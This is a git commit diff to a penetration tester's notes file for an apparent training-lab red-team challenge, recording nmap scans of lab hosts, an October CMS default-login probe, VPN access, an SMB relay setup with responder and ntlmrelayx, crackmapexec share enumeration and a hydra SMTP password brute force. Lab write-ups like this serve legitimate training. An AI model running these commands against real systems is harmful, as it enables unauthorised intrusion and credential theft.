5fb185df0bf6bb8455cee87cd5d964e9b0fc8ac2
Adib-LGS <58850596+Adib-LGS@users.noreply.github.com>
2024-04-25 22:44:36 -0400

    Brute Force + Creds + SMB

--- PNPT/ReadTeam_Challenge.sh
+++ PNPT/ReadTeam_Challenge.sh
@@ -35,7 +35,6 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
  
 
     -Web Server:
-
         nmap -T3 -sV -sC -Pn 10.200.116.13 -vv
         PORT   STATE SERVICE REASON         VERSION
         22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
@@ -49,7 +48,7 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
         Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
-        OCTOBER CMS Vulns:  <------------!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+        OCTOBER CMS Multiple Vulns:  <------------!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
             https://www.exploit-db.com/exploits/41936
 
 
@@ -91,6 +90,10 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
                         http://thereserve.thm/october/config/
 
 
+            http://10.200.116.13/october/index.php/backend/backend/auth/signin
+                admin:admin:
+                    "A user was found to match all plain text credentials however hashed credential &quot;password&quot; did not match."
+
             Possible Attack Path (We have employees Names):
                 -User Enum or Brute Force
 
@@ -103,7 +106,8 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
                         -Macro phshing - remote shell ?
 
 
-    VPN:
+
+    -VPN:
         nmap -T3 -sV -sC -Pn 10.200.116.12 -vv
         PORT   STATE SERVICE REASON  VERSION
         22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
@@ -127,9 +131,154 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
                 http://10.200.116.12/vpn/
 
                 We Found /etc/passwd + OVPN config file
-
-                We add the VPN IP Machine to the ovpn file
+                We add the VPN IP Machine into the ovpn file
 
                 sudo openvpn corpUsername.ovpn
 
             WE GET ACCESS TO THE INTERNAL NETWORK !!!!!
+
+            In the Openvpn corpUsername.com we found:
+                10.200.116.21
+                10.200.116.22
+
+
+    -Internal Network IP 10.200.116.21:
+        PORT     STATE SERVICE       REASON  VERSION
+        22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
+        135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+        139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+        445/tcp  open  microsoft-ds? syn-ack
+        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+        | rdp-ntlm-info: 
+        |   Target_Name: CORP
+        |   NetBIOS_Domain_Name: CORP
+        |   NetBIOS_Computer_Name: WRK1
+        |   DNS_Domain_Name: corp.thereserve.loc
+        |   DNS_Computer_Name: WRK1.corp.thereserve.loc
+        |   DNS_Tree_Name: thereserve.loc
+        |   Product_Version: 10.0.17763
+        |_  System_Time: 2024-04-25T16:11:36+00:00
+        | ssl-cert: Subject: commonName=WRK1.corp.thereserve.loc
+        | Issuer: commonName=WRK1.corp.thereserve.loc
+        Host script results:
+        | smb2-security-mode: 
+        |   3:1:1: 
+        |_    Message signing enabled but not required
+        | smb2-time: 
+        |   date: 2024-04-25T16:11:39
+        |_  start_date: N/A
+
+        Computer name:  WRK1.corp.thereserve.loc
+
+
+
+    -Internal Network IP 10.200.116.22:
+         └─$ nmap -sV -sC -Pn 10.200.116.22 -vv 
+        PORT     STATE SERVICE       REASON  VERSION
+        22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
+        135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+        139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+        445/tcp  open  microsoft-ds? syn-ack
+        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+
+        | rdp-ntlm-info: 
+        |   Target_Name: CORP
+        |   NetBIOS_Domain_Name: CORP
+        |   NetBIOS_Computer_Name: WRK2
+        |   DNS_Domain_Name: corp.thereserve.loc
+        |   DNS_Computer_Name: WRK2.corp.thereserve.loc
+        |   DNS_Tree_Name: thereserve.loc
+        |   Product_Version: 10.0.17763
+        |_  System_Time: 2024-04-25T17:37:17+00:00
+        | smb2-security-mode: 
+        |   3:1:1: 
+        |_    Message signing enabled but not required
+        | smb2-time: 
+        |   date: 2024-04-25T17:37:17
+        |_  start_date: N/A
+        |_clock-skew: mean: 0s, deviation: 0s, median: -1s
+
+
+
+    Port 445 SMB:
+    SMB Relay attack:
+        └─$ sudo responder -I tun0 -dwP
+        └─$ sudo /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support
+
+        -Awaiting if events occures
+
+    crackmapexec smb 10.200.116.21 -u "" -p "" --shares
+        -Access Denied but we have the domain: corp.thereserve.loc
+        SMB Guest not enable + NO ACCESS TO LDAP
+
+
+
+    -Mail Server 10.200.116.11:
+        └─$ nmap -sV -sC -Pn 10.200.116.11 -vv
+        PORT     STATE SERVICE       REASON  VERSION
+        22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
+        25/tcp   open  smtp          syn-ack hMailServer smtpd
+        | smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
+        |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+        80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
+        |_http-server-header: Microsoft-IIS/10.0
+        |_http-title: IIS Windows Server
+        | http-methods: 
+        |   Supported Methods: OPTIONS TRACE GET HEAD POST
+        |_  Potentially risky methods: TRACE
+        110/tcp  open  pop3          syn-ack hMailServer pop3d
+        |_pop3-capabilities: USER UIDL TOP
+        135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+        139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+        143/tcp  open  imap          syn-ack hMailServer imapd
+        |_imap-capabilities: IMAP4 RIGHTS=texkA0001 ACL SORT completed CHILDREN CAPABILITY OK IMAP4rev1 NAMESPACE QUOTA IDLE
+        445/tcp  open  microsoft-ds? syn-ack
+        587/tcp  open  smtp          syn-ack hMailServer smtpd
+        | smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
+        |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+        3306/tcp open  mysql         syn-ack MySQL 8.0.31
+        | mysql-info: 
+        |   Version: 8.0.31
+        |   Thread ID: 51
+        |
+        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+        | ssl-cert: Subject: commonName=MAIL.thereserve.loc
+        | Issuer: commonName=MAIL.thereserve.loc
+        |
+        | rdp-ntlm-info: 
+        |   Target_Name: THERESERVE
+        |   NetBIOS_Domain_Name: THERESERVE
+        |   NetBIOS_Computer_Name: MAIL
+        |   DNS_Domain_Name: thereserve.loc
+        |   DNS_Computer_Name: MAIL.thereserve.loc
+        |   DNS_Tree_Name: thereserve.loc
+   
+        We have an access to the email server if we enter the PROVIDE CREDS at the Begining of the ENGAGEMENT
+        We use "evolution" tools in kali
+
+
+
+        SMTP Brute Force:
+            hydra -L username.txt -P mangled_passwords.txt smtp://mail.thm -v
+
+            We found Creds !!!!!!!!!
+
+            Lets use the creds for email sign-in:
+                No-messages founded
+
+
+
+    We have access to SMB with the creds:
+        └─$ crackmapexec smb 10.200.116.22 -u xx.xx -p xxxx --shares
+            SMB         10.200.116.22   445    WRK2             Share           Permissions     Remark
+            SMB         10.200.116.22   445    WRK2             -----           -----------     ------
+            SMB         10.200.116.22   445    WRK2             ADMIN$                          Remote Admin
+            SMB         10.200.116.22   445    WRK2             C$                              Default share
+            SMB         10.200.116.22   445    WRK2             IPC$            READ            Remote IPC
+
+
+    We have RDP session enabled via 'remmina' - domain: corp.thereserve.loc
+
+    
+
+        
